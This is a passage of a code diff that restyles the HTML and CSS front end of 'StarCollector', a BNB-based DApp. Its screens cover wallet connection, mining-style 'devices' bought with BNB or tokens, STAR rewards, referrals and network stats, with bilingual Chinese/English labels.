@@ -1,675 +1,901 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Stellar Collector - Blockchain DApp</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
-    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.8/dist/chart.umd.min.js"></script>
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    colors: {
-                        primary: '#7C3AED', // 深紫
-                        secondary: '#0EA5E9', // 天蓝
-                        accent: '#EC4899', // 荧光粉
-                        ice: '#BAE6FD', // 冰蓝
-                        dark: '#1E1B4B',
-                        light: '#F8FAFC'
-                    },
-                    fontFamily: {
-                        inter: ['Inter', 'sans-serif'],
-                    },
-                    animation: {
-                        'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
-                        'number-grow': 'numberGrow 1.5s ease-out forwards',
-                        'float': 'float 6s ease-in-out infinite',
-                    },
-                    keyframes: {
-                        float: {
-                            '0%, 100%': { transform: 'translateY(0)' },
-                            '50%': { transform: 'translateY(-10px)' },
-                        },
-                        numberGrow: {
-                            '0%': { opacity: '0', transform: 'translateY(10px)' },
-                            '100%': { opacity: '1', transform: 'translateY(0)' },
-                        }
-                    }
-                },
-            }
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>StarCollector</title>
+    <meta name="description" content="Collect Stars, Earn Rewards">
+    <style>
+        :root {
+            --primary-purple: #6366f1;
+            --primary-blue: #3b82f6;
+            --accent-pink: #ec4899;
+            --accent-cyan: #22d3ee;
+            --bg-dark: #0f0f23;
+            --bg-light: #f8fafc;
+            --text-dark: #1e293b;
+            --text-light: #e2e8f0;
+            --card-shadow: 0 8px 32px rgba(0,0,0,0.3);
+            --border-radius: 20px;
+            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         }
-    </script>
-    <style type="text/tailwindcss">
-        @layer utilities {
-            .content-auto {
-                content-visibility: auto;
-            }
-            .gradient-bg {
-                background: linear-gradient(135deg, #7C3AED 0%, #0EA5E9 100%);
-            }
-            .card-shadow {
-                box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12);
-            }
-            .neon-border {
-                box-shadow: 0 0 10px rgba(124, 58, 237, 0.5), 0 0 20px rgba(14, 165, 233, 0.3);
-            }
-            .text-gradient {
-                background-clip: text;
-                -webkit-background-clip: text;
-                color: transparent;
-                background-image: linear-gradient(90deg, #7C3AED, #0EA5E9);
-            }
-            .ripple {
-                position: relative;
-                overflow: hidden;
-            }
-            .ripple:after {
-                content: "";
-                display: block;
-                position: absolute;
-                width: 100%;
-                height: 100%;
-                top: 0;
-                left: 0;
-                pointer-events: none;
-                background-image: radial-gradient(circle, #fff 10%, transparent 10.01%);
-                background-repeat: no-repeat;
-                background-position: 50%;
-                transform: scale(10, 10);
-                opacity: 0;
-                transition: transform 0.5s, opacity 0.3s;
-            }
-            .ripple:active:after {
-                transform: scale(0, 0);
-                opacity: 0.3;
-                transition: 0s;
-            }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, var(--bg-dark) 0%, #1a1a3e 100%);
+            color: var(--text-light);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        body.light {
+            background: linear-gradient(135deg, var(--bg-light) 0%, #e0f2fe 100%);
+            color: var(--text-dark);
+        }
+
+        .container {
+            max-width: 428px;
+            margin: 0 auto;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding-bottom: 100px;
+        }
+
+        .screen {
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .screen.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: var(--border-radius);
+            padding: 24px;
+            margin-bottom: 20px;
+            box-shadow: var(--card-shadow);
+            transition: var(--transition);
+        }
+
+        body.light .card {
+            background: rgba(255, 255, 255, 0.8);
+            border: 1px solid rgba(0, 0, 0, 0.1);
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            background: linear-gradient(135deg, var(--primary-purple), var(--accent-cyan));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .connect-btn {
+            width: 100%;
+            max-width: 300px;
+            padding: 16px 32px;
+            background: linear-gradient(135deg, var(--primary-purple), var(--accent-cyan));
+            border: none;
+            border-radius: 50px;
+            color: white;
+            font-size: 18px;
+            cursor: pointer;
+            transition: var(--transition);
+            margin: 40px auto;
+            display: block;
+        }
+
+        .connect-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 30px rgba(99, 102, 241, 0.5);
+        }
+
+        .connect-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .device-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 16px;
+            margin: 20px 0;
+        }
+
+        .device-card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: var(--border-radius);
+            padding: 16px;
+            text-align: center;
+            transition: var(--transition);
+        }
+
+        .device-icon {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 12px;
+            background: linear-gradient(135deg, var(--accent-pink), var(--accent-cyan));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(34, 211, 238, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(34, 211, 238, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(34, 211, 238, 0); }
+        }
+
+        .action-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(15, 15, 35, 0.9);
+            backdrop-filter: blur(20px);
+            padding: 16px;
+            display: flex;
+            gap: 12px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .action-btn {
+            flex: 1;
+            padding: 12px 24px;
+            background: linear-gradient(135deg, var(--primary-purple), var(--primary-blue));
+            border: none;
+            border-radius: 25px;
+            color: white;
+            cursor: pointer;
+            transition: var(--transition);
+            font-size: 14px;
+        }
+
+        .action-btn:hover {
+            transform: scale(1.05);
+        }
+
+        .action-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .loading {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+
+        .loading.active {
+            display: flex;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top: 3px solid var(--accent-cyan);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .toast {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 16px 24px;
+            background: #10b981;
+            color: white;
+            border-radius: 12px;
+            display: none;
+            z-index: 10000;
+            animation: slideIn 0.3s ease;
+            max-width: 90%;
+            text-align: center;
+        }
+
+        .toast.error {
+            background: #ef4444;
+        }
+
+        @keyframes slideIn {
+            from { transform: translate(-50%, -100px); }
+            to { transform: translate(-50%, 0); }
+        }
+
+        .lang-switch {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 8px 16px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            cursor: pointer;
+            z-index: 1000;
+        }
+
+        .wallet-info {
+            padding: 8px 16px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .shop-grid {
+            display: grid;
+            gap: 20px;
+        }
+
+        .shop-item {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 20px;
+            border-radius: var(--border-radius);
+        }
+
+        .shop-item h4 {
+            margin-bottom: 10px;
+            color: var(--accent-cyan);
+        }
+
+        .input-group {
+            margin: 10px 0;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            color: inherit;
+            font-size: 16px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 8px 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary-purple), var(--accent-cyan));
+            transition: width 0.3s ease;
         }
     </style>
 </head>
-<body class="bg-gray-50 dark:bg-gray-900 font-inter text-gray-800 dark:text-gray-100 min-h-screen transition-colors duration-300">
-    <!-- 钱包连接页 -->
-    <div id="wallet-connect" class="min-h-screen flex flex-col">
-        <div class="gradient-bg flex-1 p-6 flex flex-col items-center justify-center text-white">
-            <div class="absolute inset-0 bg-[url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjAiIGhlaWdodD0iNjAiIHZpZXdCb3g9IjAgMCA2MCA2MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPjxnIGZpbGw9IiMyMDIwMjAiIGZpbGwtb3BhY2l0eT0iMC4wNSI+PHBhdGggZD0iTTEgMUg1OUwxIDU5VjF6TTYgNlY1NEw1NCA1NFY2SDZ6TTExIDExVjQ5TDQ5IDQ5VjExTDExIDExeiIvPjwvZz48cGF0aCBkPSJNMjEgMTFWNDVMMzkgNDVWMTFIMjF6TTI2IDE2VjQwTDM0IDQwVjE2SDI2eiIvPjwvZz48L3N2Zz4=')] opacity-20"></div>
-            <div class="text-center z-10">
-                <h1 class="text-[clamp(2rem,5vw,3rem)] font-bold mb-2 animate-float">Collect Stars</h1>
-                <p class="text-[clamp(1rem,2vw,1.25rem)] mb-12">Earn Rewards in the Blockchain Galaxy</p>
-                <div class="w-32 h-32 mx-auto mb-10 relative">
-                    <div class="absolute inset-0 rounded-full border-4 border-white/20 animate-pulse-slow"></div>
-                    <div class="absolute inset-4 rounded-full border-4 border-white/30 animate-pulse-slow" style="animation-delay: 0.5s"></div>
-                    <div class="absolute inset-8 rounded-full gradient-bg flex items-center justify-center">
-                        <<i class="fa fa-link text-3xl"></</i>
-                    </div>
-                </div>
-                <button id="connect-btn" class="ripple gradient-bg hover:opacity-90 text-white font-medium py-4 px-12 rounded-full text-lg card-shadow transition-all duration-300 transform hover:scale-105 active:scale-95">
-                    Connect Wallet
+<body>
+    <!-- 加载中 -->
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+    </div>
+
+    <!-- 提示信息 -->
+    <div class="toast" id="toast"></div>
+
+    <!-- 语言切换 -->
+    <div class="lang-switch" onclick="toggleLanguage()">
+        <span data-en="EN" data-zh="中">中</span>
+    </div>
+
+    <div class="container">
+        <!-- 钱包连接页 -->
+        <div class="screen active" id="wallet-connect">
+            <div style="text-align: center; margin-top: 40vh; transform: translateY(-50%);">
+                <h1 style="font-size: 48px; margin-bottom: 20px;">
+                    <span data-en="StarCollector" data-zh="星收集器">星收集器</span>
+                </h1>
+                <p style="opacity: 0.8; margin-bottom: 40px;">
+                    <span data-en="Collect Stars, Earn Rewards" data-zh="收集星星，获得奖励">收集星星，获得奖励</span>
+                </p>
+                <button class="connect-btn" onclick="connectWallet()" id="connect-btn">
+                    <span data-en="Connect Wallet" data-zh="连接钱包">连接钱包</span>
                 </button>
-                <p class="text-sm mt-8 text-white/70">
-                    Supports MetaMask, Trust Wallet and other wallet browsers
+                <p style="font-size: 14px; opacity: 0.6; margin-top: 20px;">
+                    <span data-en="Support MetaMask, Trust Wallet" data-zh="支持MetaMask、Trust Wallet">支持MetaMask、Trust Wallet</span>
                 </p>
             </div>
         </div>
-    </div>
 
-    <!-- 个人仪表盘 -->
-    <div id="dashboard" class="hidden">
-        <!-- 顶部导航 -->
-        <header class="sticky top-0 z-50 bg-white dark:bg-gray-800 shadow-sm py-3 px-4">
-            <div class="flex justify-between items-center">
-                <div class="text-gradient font-bold text-xl">StarCollector</div>
-                <div class="flex items-center">
-                    <button id="theme-toggle" class="p-2 rounded-full hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors">
-                        <<i class="fa fa-moon-o dark:hidden"></</i>
-                        <<i class="fa fa-sun-o hidden dark:inline"></</i>
+        <!-- 仪表盘 -->
+        <div class="screen" id="dashboard">
+            <div class="header">
+                <div class="logo">StarCollector</div>
+                <div class="wallet-info" onclick="showFullAddress()">
+                    <span id="wallet-short">0x000...0000</span>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3><span data-en="My Assets" data-zh="我的资产">我的资产</span></h3>
+                <div style="display: flex; justify-content: space-between; align-items: center; margin: 16px 0;">
+                    <div>
+                        <div style="font-size: 28px; font-weight: bold;" id="user-balance">0</div>
+                        <div style="opacity: 0.7;"><span data-en="STAR Tokens" data-zh="STAR代币">STAR代币</span></div>
+                    </div>
+                    <button class="action-btn" onclick="claimRewards()" style="padding: 12px 24px;">
+                        <span data-en="Claim" data-zh="领取">领取</span>
+                        <span id="unclaimed-amount" style="font-size: 12px;">(0)</span>
                     </button>
-                    <div class="ml-3 relative group">
-                        <span id="user-address" class="text-sm font-medium bg-gray-100 dark:bg-gray-700 px-3 py-1 rounded-full">0x71C...8f2A</span>
-                        <div class="absolute right-0 mt-2 w-48 bg-white dark:bg-gray-800 rounded-lg shadow-lg p-3 hidden group-hover:block card-shadow">
-                            <p class="text-xs text-gray-500 dark:text-gray-400">Full Address</p>
-                            <p class="text-sm font-mono break-all">0x71C7656EC7ab88b098defB751B7401B5f6d8f2A</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </header>
-
-        <main class="p-4 pb-24">
-            <!-- 顶部数据卡片 -->
-            <div class="gradient-bg rounded-2xl p-6 mb-6 text-white card-shadow relative overflow-hidden">
-                <div class="absolute top-0 right-0 w-40 h-40 bg-white/10 rounded-full -mr-20 -mt-20"></div>
-                <div class="relative z-10">
-                    <div class="flex justify-between items-start mb-6">
-                        <div>
-                            <p class="text-white/80 text-sm">Total Assets</p>
-                            <h2 class="text-[clamp(1.5rem,3vw,2.5rem)] font-bold" id="total-assets">0.0000</h2>
-                            <p class="text-white/80 text-sm">Reward Token</p>
-                        </div>
-                        <button class="bg-white text-primary font-medium py-2 px-4 rounded-full text-sm shadow-lg transition-all duration-300 transform hover:scale-105 active:scale-95 flex items-center">
-                            <span>Claim Rewards</span>
-                            <span class="ml-1 w-2 h-2 bg-red-500 rounded-full"></span>
-                        </button>
-                    </div>
-                    
-                    <div class="grid grid-cols-2 gap-4">
-                        <div class="bg-white/10 backdrop-blur-sm rounded-xl p-3">
-                            <p class="text-white/80 text-sm">Accumulated Earnings</p>
-                            <p class="text-xl font-bold" id="accumulated-earnings">0.0000</p>
-                        </div>
-                        <div class="bg-white/10 backdrop-blur-sm rounded-xl p-3">
-                            <p class="text-white/80 text-sm">Today's Estimated Earnings</p>
-                            <p class="text-xl font-bold" id="daily-earnings">0.0000</p>
-                        </div>
-                    </div>
                 </div>
             </div>
 
-            <!-- 矿机状态区 -->
-            <div class="bg-white dark:bg-gray-800 rounded-2xl p-6 mb-6 card-shadow">
-                <h3 class="text-lg font-semibold mb-4">Device Status</h3>
-                
-                <div class="mb-6">
-                    <div class="flex justify-between items-center mb-2">
-                        <span class="text-gray-600 dark:text-gray-400">Total Network Power</span>
-                        <span class="font-medium">37.8%</span>
+            <div class="card">
+                <h3><span data-en="My Devices" data-zh="我的设备">我的设备</span></h3>
+                <div class="device-grid">
+                    <div class="device-card">
+                        <div class="device-icon">🌙</div>
+                        <div><span data-en="Moonlight Converter" data-zh="月光转换器">月光转换器</span></div>
+                        <div id="initial-count">0</div>
                     </div>
-                    <div class="w-full bg-gray-200 dark:bg-gray-700 rounded-full h-2">
-                        <div class="gradient-bg h-2 rounded-full" style="width: 37.8%"></div>
+                    <div class="device-card" id="test-device" style="display: none;">
+                        <div class="device-icon">👻</div>
+                        <div><span data-en="Phantom Debugger" data-zh="幻影调试器">幻影调试器</span></div>
+                        <div id="test-count">0</div>
                     </div>
                 </div>
-
-                <div class="space-y-4">
-                    <div class="bg-gray-50 dark:bg-gray-700/50 rounded-xl p-4">
-                        <h4 class="font-medium mb-2">Initial Devices</h4>
-                        <p>Quantity: <span id="initial-count">0</span> | Power per unit: 1.00</p>
+                <div class="device-grid" id="power-devices">
+                    <div class="device-card">
+                        <div class="device-icon">✨</div>
+                        <div><span data-en="Stardust L1" data-zh="星尘L1">星尘L1</span></div>
+                        <div id="power-0">0</div>
                     </div>
-                    
-                    <div class="admin-only hidden bg-gray-50 dark:bg-gray-700/50 rounded-xl p-4">
-                        <h4 class="font-medium mb-2">Test Devices</h4>
-                        <p>Quantity: <span id="test-count">0</span> | Power per unit: 1.00</p>
+                    <div class="device-card">
+                        <div class="device-icon">🌸</div>
+                        <div><span data-en="Quantum L2" data-zh="量子L2">量子L2</span></div>
+                        <div id="power-1">0</div>
                     </div>
-                    
-                    <div class="bg-gray-50 dark:bg-gray-700/50 rounded-xl p-4">
-                        <h4 class="font-medium mb-2">Advanced Devices</h4>
-                        <div class="space-y-2">
-                            <p>Stardust Collector L1: <span id="l1-count">0</span> units, Power ×1.76</p>
-                            <p>Quantum Dandelion L2: <span id="l2-count">0</span> units, Power ×2.34</p>
-                            <p>Aurora Weaver L3: <span id="l3-count">0</span> units, Power ×3.52</p>
-                            <p>Galaxy Filter L4: <span id="l4-count">0</span> units, Power ×5.18</p>
-                        </div>
+                    <div class="device-card">
+                        <div class="device-icon">🌈</div>
+                        <div><span data-en="Aurora L3" data-zh="极光L3">极光L3</span></div>
+                        <div id="power-2">0</div>
+                    </div>
+                    <div class="device-card">
+                        <div class="device-icon">🌌</div>
+                        <div><span data-en="Galaxy L4" data-zh="银河L4">银河L4</span></div>
+                        <div id="power-3">0</div>
                     </div>
                 </div>
             </div>
 
-            <!-- 收益历史图表 -->
-            <div class="bg-white dark:bg-gray-800 rounded-2xl p-6 mb-6 card-shadow">
-                <h3 class="text-lg font-semibold mb-4">Earnings History (Last 7 Days)</h3>
-                <div class="h-64">
-                    <canvas id="earnings-chart"></canvas>
+            <div class="card">
+                <h3><span data-en="Total Power" data-zh="总算力">总算力</span></h3>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="power-progress" style="width: 0%"></div>
                 </div>
-            </div>
-        </main>
-
-        <!-- 底部导航 -->
-        <nav class="fixed bottom-0 left-0 right-0 bg-white dark:bg-gray-800 shadow-lg px-6 py-3 border-t dark:border-gray-700">
-            <div class="grid grid-cols-3 gap-4">
-                <button class="flex flex-col items-center justify-center text-primary">
-                    <<i class="fa fa-tachometer text-xl mb-1"></</i>
-                    <span class="text-xs">Dashboard</span>
-                </button>
-                <button class="flex flex-col items-center justify-center text-gray-500 dark:text-gray-400">
-                    <<i class="fa fa-shopping-cart text-xl mb-1"></</i>
-                    <span class="text-xs">Shop</span>
-                </button>
-                <button class="flex flex-col items-center justify-center text-gray-500 dark:text-gray-400">
-                    <<i class="fa fa-balance-scale text-xl mb-1"></</i>
-                    <span class="text-xs">Rewards</span>
-                </button>
-            </div>
-        </nav>
-    </div>
-
-    <!-- 设备商店页面 -->
-    <div id="device-shop" class="hidden">
-        <!-- 顶部导航 -->
-        <header class="sticky top-0 z-50 bg-white dark:bg-gray-800 shadow-sm py-3 px-4">
-            <div class="flex justify-between items-center">
-                <button id="back-to-dashboard" class="p-2 rounded-full hover:bg-gray-100 dark:hover:bg-gray-700">
-                    <<i class="fa fa-arrow-left"></</i>
-                </button>
-                <h1 class="text-gradient font-bold text-xl">Device Shop</h1>
-                <div class="w-8"></div>
-            </div>
-        </header>
-
-        <!-- 分类标签 -->
-        <div class="bg-white dark:bg-gray-800 shadow-sm">
-            <div class="flex overflow-x-auto py-2 px-4 space-x-2 no-scrollbar">
-                <button class="whitespace-nowrap bg-primary text-white px-4 py-2 rounded-full text-sm font-medium">Initial Devices</button>
-                <button class="whitespace-nowrap bg-gray-100 dark:bg-gray-700 px-4 py-2 rounded-full text-sm font-medium">Advanced Devices</button>
-                <button class="whitespace-nowrap bg-gray-100 dark:bg-gray-700 px-4 py-2 rounded-full text-sm font-medium admin-only hidden">Test Devices</button>
+                <div id="user-power">0 / 0</div>
             </div>
         </div>
 
-        <main class="p-4 pb-24">
-            <!-- 初始设备 -->
-            <div class="bg-white dark:bg-gray-800 rounded-2xl p-6 mb-6 card-shadow">
-                <div class="flex flex-col md:flex-row gap-6">
-                    <div class="w-full md:w-1/3 flex justify-center">
-                        <div class="w-32 h-32 relative">
-                            <div class="absolute inset-0 rounded-full border-4 border-primary/20 animate-pulse-slow"></div>
-                            <div class="absolute inset-0 rounded-full bg-gradient-to-br from-primary to-secondary flex items-center justify-center">
-                                <<i class="fa fa-moon-o text-4xl text-white"></</i>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="w-full md:w-2/3">
-                        <h2 class="text-2xl font-bold mb-2">Moonlight Converter</h2>
-                        <p class="text-gray-600 dark:text-gray-400 mb-4">Your first step into the galaxy. Collects basic star particles.</p>
-                        
-                        <div class="grid grid-cols-2 gap-4 mb-6">
-                            <div class="bg-gray-100 dark:bg-gray-700 rounded-xl p-3">
-                                <p class="text-gray-600 dark:text-gray-400 text-sm">Price</p>
-                                <p class="text-xl font-bold">0.01 BNB</p>
-                            </div>
-                            <div class="bg-gray-100 dark:bg-gray-700 rounded-xl p-3">
-                                <p class="text-gray-600 dark:text-gray-400 text-sm">Power</p>
-                                <p class="text-xl font-bold">×1.00</p>
-                            </div>
-                        </div>
-                        
-                        <div class="flex items-center justify-between">
-                            <div class="flex items-center border border-gray-300 dark:border-gray-600 rounded-full">
-                                <button class="w-10 h-10 flex items-center justify-center rounded-l-full hover:bg-gray-100 dark:hover:bg-gray-700" disabled>
-                                    <<i class="fa fa-minus"></</i>
-                                </button>
-                                <input type="number" value="1" min="1" max="1" class="w-12 text-center py-2 bg-transparent" readonly>
-                                <button class="w-10 h-10 flex items-center justify-center rounded-r-full hover:bg-gray-100 dark:hover:bg-gray-700" disabled>
-                                    <<i class="fa fa-plus"></</i>
-                                </button>
-                            </div>
-                            <button class="ripple gradient-bg hover:opacity-90 text-white font-medium py-2 px-6 rounded-full text-sm card-shadow transition-all duration-300 transform hover:scale-105 active:scale-95">
-                                Buy Now
-                            </button>
-                        </div>
-                        <p class="text-xs text-gray-500 dark:text-gray-400 mt-3 text-center">Limit 1 per user</p>
-                    </div>
+        <!-- 商店 -->
+        <div class="screen" id="shop">
+            <div class="header">
+                <h2><span data-en="Device Shop" data-zh="设备商店">设备商店</span></h2>
+            </div>
+
+            <div class="card">
+                <h3><span data-en="Moonlight Converter" data-zh="月光转换器">月光转换器</span></h3>
+                <p><span data-en="Price: 0.01 BNB" data-zh="价格：0.01 BNB">价格：0.01 BNB</span></p>
+                <p><span data-en="Limit: 1 per user" data-zh="限购：每人1台">限购：每人1台</span></p>
+                <button class="action-btn" onclick="buyInitialMachine()">
+                    <span data-en="Buy Now" data-zh="立即购买">立即购买</span>
+                </button>
+            </div>
+
+            <div class="card">
+                <h3><span data-en="Advanced Devices" data-zh="进阶设备">进阶设备</span></h3>
+                <div id="power-shop">
+                    <!-- 动态生成 -->
                 </div>
             </div>
 
-            <!-- 进阶设备 -->
-            <div class="space-y-6">
-                <h3 class="text-lg font-semibold">Advanced Devices</h3>
-                
-                <!-- 星尘收集器L1 -->
-                <div class="bg-white dark:bg-gray-800 rounded-2xl p-6 card-shadow">
-                    <div class="flex justify-between items-start mb-4">
-                        <div>
-                            <h3 class="text-xl font-bold">Stardust Collector L1</h3>
-                            <p class="text-gray-600 dark:text-gray-400">Collects stardust particles with enhanced efficiency</p>
-                        </div>
-                        <div class="bg-primary/10 text-primary font-medium py-1 px-3 rounded-full text-sm">
-                            Power ×1.76
-                        </div>
-                    </div>
-                    
-                    <div class="grid grid-cols-2 gap-4 mb-6">
-                        <div>
-                            <p class="text-gray-600 dark:text-gray-400 text-sm">Price</p>
-                            <p class="text-xl font-bold">100 Reward Token</p>
-                        </div>
-                        <div>
-                            <p class="text-gray-600 dark:text-gray-400 text-sm">Max per purchase</p>
-                            <p class="text-xl font-bold">100 units</p>
-                        </div>
-                    </div>
-                    
-                    <div class="flex items-center justify-between">
-                        <div class="flex items-center border border-gray-300 dark:border-gray-600 rounded-full">
-                            <button class="w-10 h-10 flex items-center justify-center rounded-l-full hover:bg-gray-100 dark:hover:bg-gray-700">
-                                <<i class="fa fa-minus"></</i>
-                            </button>
-                            <input type="number" value="1" min="1" max="100" class="w-12 text-center py-2 bg-transparent">
-                            <button class="w-10 h-10 flex items-center justify-center rounded-r-full hover:bg-gray-100 dark:hover:bg-gray-700">
-                                <<i class="fa fa-plus"></</i>
-                            </button>
-                        </div>
-                        <button class="ripple gradient-bg hover:opacity-90 text-white font-medium py-2 px-6 rounded-full text-sm card-shadow transition-all duration-300 transform hover:scale-105 active:scale-95">
-                            Buy in Bulk
-                        </button>
-                    </div>
-                </div>
-
-                <!-- 其他进阶设备省略 -->
+            <div class="card" id="test-shop" style="display: none;">
+                <h3><span data-en="Phantom Debugger" data-zh="幻影调试器">幻影调试器</span></h3>
+                <p><span data-en="Price: 0.0001 BNB" data-zh="价格：0.0001 BNB">价格：0.0001 BNB</span></p>
+                <button class="action-btn" onclick="buyTestMachine()">
+                    <span data-en="Buy Test" data-zh="购买测试">购买测试</span>
+                </button>
             </div>
-        </main>
+        </div>
+
+        <!-- 推荐中心 -->
+        <div class="screen" id="referral">
+            <div class="header">
+                <h2><span data-en="Referral Center" data-zh="推荐中心">推荐中心</span></h2>
+            </div>
+
+            <div class="card">
+                <h3><span data-en="Set Referrer" data-zh="设置推荐人">设置推荐人</span></h3>
+                <div class="input-group">
+                    <input type="text" id="referrer-input" placeholder="0x..." maxlength="42">
+                    <button class="action-btn" onclick="setReferrer()">
+                        <span data-en="Set Referrer" data-zh="设置推荐人">设置推荐人</span>
+                    </button>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3><span data-en="My Referral Code" data-zh="我的推荐码">我的推荐码</span></h3>
+                <div style="background: rgba(255,255,255,0.1); padding: 12px; border-radius: 8px; word-break: break-all;">
+                    <span id="my-referral">0x...</span>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3><span data-en="Referral Rewards" data-zh="推荐奖励">推荐奖励</span></h3>
+                <div id="referral-rewards">0 STAR</div>
+                <div id="referral-records"></div>
+            </div>
+        </div>
+
+        <!-- 全局数据 -->
+        <div class="screen" id="global">
+            <div class="header">
+                <h2><span data-en="Global Stats" data-zh="全局数据">全局数据</span></h2>
+            </div>
+
+            <div class="card">
+                <h3><span data-en="Network Overview" data-zh="网络概览">网络概览</span></h3>
+                <div id="global-stats"></div>
+            </div>
+        </div>
 
         <!-- 底部导航 -->
-        <nav class="fixed bottom-0 left-0 right-0 bg-white dark:bg-gray-800 shadow-lg px-6 py-3 border-t dark:border-gray-700">
-            <div class="grid grid-cols-3 gap-4">
-                <button class="flex flex-col items-center justify-center text-gray-500 dark:text-gray-400">
-                    <<i class="fa fa-tachometer text-xl mb-1"></</i>
-                    <span class="text-xs">Dashboard</span>
-                </button>
-                <button class="flex flex-col items-center justify-center text-primary">
-                    <<i class="fa fa-shopping-cart text-xl mb-1"></</i>
-                    <span class="text-xs">Shop</span>
-                </button>
-                <button class="flex flex-col items-center justify-center text-gray-500 dark:text-gray-400">
-                    <<i class="fa fa-balance-scale text-xl mb-1"></</i>
-                    <span class="text-xs">Rewards</span>
-                </button>
-            </div>
-        </nav>
+        <div class="action-bar">
+            <button class="action-btn" onclick="showScreen('dashboard')">
+                <span data-en="Dashboard" data-zh="仪表盘">仪表盘</span>
+            </button>
+            <button class="action-btn" onclick="showScreen('shop')">
+                <span data-en="Shop" data-zh="商店">商店</span>
+            </button>
+            <button class="action-btn" onclick="showScreen('referral')">
+                <span data-en="Referral" data-zh="推荐">推荐</span>
+            </button>
+            <button class="action-btn" onclick="showScreen('global')">
+                <span data-en="Global" data-zh="全局">全局</span>
+            </button>
+        </div>
     </div>
 
-    <!-- 收益与推荐中心 -->
-    <div id="rewards-center" class="hidden">
-        <!-- 顶部导航 -->
-        <header class="sticky top-0 z-50 bg-white dark:bg-gray-800 shadow-sm py-3 px-4">
-            <div class="flex justify-between items-center">
-                <button id="back-from-rewards" class="p-2 rounded-full hover:bg-gray-100 dark:hover:bg-gray-700">
-                    <<i class="fa fa-arrow-left"></</i>
-                </button>
-                <h1 class="text-gradient font-bold text-xl">Rewards & Referrals</h1>
-                <div class="w-8"></div>
-            </div>
-        </header>
-
-        <main class="p-4 pb-24">
-            <!-- 收益领取区 -->
-            <div class="bg-white dark:bg-gray-800 rounded-2xl p-6 mb-6 card-shadow">
-                <h2 class="text-xl font-bold mb-4">Claim Your Rewards</h2>
-                
